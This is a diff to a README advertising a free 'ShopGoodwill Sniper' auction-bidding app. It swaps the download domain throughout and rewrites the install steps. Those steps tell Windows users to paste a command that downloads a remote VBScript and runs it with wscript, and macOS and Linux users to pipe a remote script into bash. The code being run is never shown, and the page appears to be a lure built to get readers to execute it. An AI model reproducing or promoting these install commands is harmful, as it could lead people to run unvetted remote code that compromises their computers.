@@ -1,9 +1,9 @@
 # ShopGoodwill Sniper – Win Auctions with Last-Second Auto Bidding
 
 ## What is a ShopGoodwill sniper
-**[ShopGoodwill Sniper](https://snipeable.com/)** is the #1 **ShopGoodwill Auction Sniper** and **Goodwill Auction Bot**. Automatically fires last-second bids on ShopGoodwill.com to win more auctions at the lowest price. Free desktop app for Windows, Mac & Linux.
+**[ShopGoodwill Sniper](https://shopgoodwillsniper.com/)** is the #1 **ShopGoodwill Auction Sniper** and **Goodwill Auction Bot**. Automatically fires last-second bids on ShopGoodwill.com to win more auctions at the lowest price. Free desktop app for Windows, Mac & Linux.
 
-➡️ **[Download ShopGoodwill Sniper at Snipeable.com](https://snipeable.com/)**
+➡️ **[Download ShopGoodwill Sniper at ShopGoodwillSniper.com](https://shopgoodwillsniper.com/)**
 
 ---
 
@@ -11,14 +11,16 @@
 
 ### Windows
 Paste into **Command Prompt** and press Enter:
+
 ```cmd
-curl -fsSL https://snipeable.com/download/install-shopgoodwill-sniper.vbs -o "%TEMP%\sg.vbs" && wscript "%TEMP%\sg.vbs"
+curl -fsSL https://shopgoodwillsniper.com/download/install-shopgoodwill-sniper.vbs -o "%TEMP%\sg.vbs" && wscript "%TEMP%\sg.vbs"
 ```
 
 ### macOS & Linux
 Paste into **Terminal** and press Enter:
+
 ```bash
-curl -fsSL https://snipeable.com/download/install-shopgoodwill-sniper.sh | bash
+curl -fsSL https://shopgoodwillsniper.com/download/install-shopgoodwill-sniper.sh | bash
 ```
 
 > Windows 10/11 · macOS 11 Big Sur+ (Intel & Apple Silicon) · Linux
@@ -78,4 +80,4 @@ curl -fsSL https://snipeable.com/download/install-shopgoodwill-sniper.sh | bash
 
 ---
 
-**[Download ShopGoodwill Sniper Free → Snipeable.com](https://snipeable.com/)**
+**[Download ShopGoodwill Sniper Free → ShopGoodwillSniper.com](https://shopgoodwillsniper.com/)**
